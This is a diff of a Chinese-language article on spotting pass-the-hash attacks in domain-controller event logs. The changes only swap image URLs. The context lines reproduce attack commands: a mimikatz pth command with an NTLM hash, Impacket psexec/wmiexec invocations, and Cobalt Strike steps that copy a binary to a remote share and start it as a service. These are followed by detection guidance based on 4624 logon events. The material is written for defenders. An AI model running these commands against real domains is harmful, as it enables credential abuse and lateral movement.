@@ -33,11 +33,11 @@ Event日志如何检测哈希传递攻击，这个就是我们今天探讨的话
     
      #提权 privilege::debug #使用域管理员bypassu拍卖行及的NTLM值进行哈希传递攻击 sekurlsa::pth /user:bypass /domain:evil.com /ntlm:44f077e27f6fef69e7bd834c7242b040
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221208204539.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221208204539.png)
 
 利用PsExec.exe来远程登录和执行命令
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221208204550.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221208204550.png)
 
  **（2）使用lmpacket工具包进行哈希传递获取域控权限**
 
@@ -49,7 +49,7 @@ lmpacket工具包集成了多个脚本，可用来进行哈希传递，如psexec
     
     psexec.py  -hashes 00000000000000000000000000000000:44f077e27f6fef69e7bd834c7242b040 bypass@192.168.44.219wmiexec.py -hashes 00000000000000000000000000000000:44f077e27f6fef69e7bd834c7242b040 bypass@192.168.44.219
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221208204551.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221208204551.png)
 
  **(3) 通过Cobalt strike进行pth横向获取域控权限**
 
@@ -71,13 +71,13 @@ lmpacket工具包集成了多个脚本，可用来进行哈希传递，如psexec
     
     shell copy  C:\Users\administrator\Desktop\artifact.exe \\192.168.44.219\c$shell sc \\192.168.44.219 create test binpath=C:\artifact.exeshell sc \\192.168.44.219 start testshell sc \\192.168.44.219 delete test
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221208204553.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221208204553.png)
 
  **03、哈希传递攻击检测**
 
 哈希传递攻击的检测其实是比较困难的，因为它总是和正常的访问行为非常类似，我们需要从域控收集的大量的安全日志中找到需要关心的事件和具体的值。
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221208204554.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221208204554.png)
 
 分析：在使用NTLM凭证进行横向获取域控权限时，域控的日志中会记录4624登录事件，LogonType为3且登录进程为NtlmSsp，这里可以找到登录用户和登录源地址。为了能从正常的访问行为中，找出异常登录行为，我们可以设置白名单，将域控管理员和正常登录来源IP添加至白名单，关注关键用户的登录行为，排除干扰项。另外，当攻击者使用工具进行哈希传递的时候，比如使用psexec.py脚本进行哈希传递会同时产生多条LogonType为3且登录进程为NtlmSsp的日志，我们还可以将登录频率作为判断依据进行检测。
 
@@ -91,7 +91,7 @@ lmpacket工具包集成了多个脚本，可用来进行哈希传递，如psexec
 
 告警效果如下图：
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221208204556.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20221208204556.png)
 
 预览时标签不可点
 
